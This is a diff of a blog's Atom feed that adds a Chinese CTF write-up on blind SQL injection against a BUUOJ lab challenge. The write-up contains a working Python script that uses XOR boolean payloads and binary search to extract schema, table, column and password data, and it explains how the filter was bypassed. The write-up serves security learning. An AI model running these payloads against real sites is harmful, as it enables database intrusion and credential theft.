@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-11-16T14:27:38.261Z</updated>
+  <updated>2021-11-19T13:34:07.163Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>finalsql</title>
+    <link href="http://example.com/2021/11/19/wp/"/>
+    <id>http://example.com/2021/11/19/wp/</id>
+    <published>2021-11-19T12:53:10.000Z</published>
+    <updated>2021-11-19T13:34:07.163Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="第一次写盲注脚本"><a href="#第一次写盲注脚本" class="headerlink" title="第一次写盲注脚本"></a>第一次写盲注脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">280</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(high&gt;low):</span><br><span class="line">        url = <span class="string">&quot;http://5ab2fc5d-f744-4401-9552-f1b496e7e678.node4.buuoj.cn:81/search.php&quot;</span></span><br><span class="line">        <span class="comment">#payload=&quot;?id=1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查库</span></span><br><span class="line">        <span class="comment">#payload =&quot;?id=1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查列</span></span><br><span class="line">        <span class="comment">#payload=&quot;?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查表</span></span><br><span class="line">        <span class="comment">#payload=&quot;?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查字段</span></span><br><span class="line">        payload= <span class="string">&quot;?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="comment">#查password</span></span><br><span class="line">        url+=payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Cl&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (mid==<span class="number">32</span> <span class="keyword">or</span> mid==<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#print(chr(mid))</span></span><br><span class="line">    flag += <span class="built_in">chr</span> (mid)</span><br><span class="line">    <span class="comment">#print(mid)</span></span><br><span class="line">    <span class="comment">#print(chr(mid))</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="总结步骤"><a href="#总结步骤" class="headerlink" title="总结步骤"></a>总结步骤</h1><ol><li>fuzz查过滤</li><li>考虑查注入</li><li>然后写脚本</li></ol><p><img src="https://i.loli.net/2021/11/19/n5blAoWmT41eLUJ.png" alt="QQ截图20211119210158.png"></p><p>根据提示，尝试对？id=进行fuzz</p><p>发现空格和and和||和$$被过滤了</p><p>而^没有被过滤</p><p>尝试用1^^1</p><p><img src="https://i.loli.net/2021/11/19/dH3Y57PkpW9xgLF.png" alt="QQ截图20211119211628.png"></p><p>可以利用可行的注入符合提供思路</p><p>“1^ 0 ^ 1”为假</p><p>“1 ^ 1 ^ 1”为真来嵌套语句</p><h1 id="利用二分法来简化爆破"><a href="#利用二分法来简化爆破" class="headerlink" title="利用二分法来简化爆破"></a>利用二分法来简化爆破</h1><p>32是空格，ascii最多到127，所以可显字符是32到127</p><p>我们取中间数为mid为80，high为128，low为32（方便除二）</p><p>若这个要猜的值比80大，就到80到128的区间类取中值比较，以此类推，因为这个数必是整数，所以必可以找到。</p><p><img src="https://i.loli.net/2021/11/19/CFx2wMBOHc5yViq.png" alt="QQ截图20211119212958.png"></p><p>最后在一大堆password里面找到。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;第一次写盲注脚本&quot;&gt;&lt;a href=&quot;#第一次写盲注脚本&quot; class=&quot;headerlink&quot; title=&quot;第一次写盲注脚本&quot;&gt;&lt;/a&gt;第一次写盲注脚本&lt;/h1&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c</summary>
+      
+    
+    
+    
+    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>无列名注入</title>
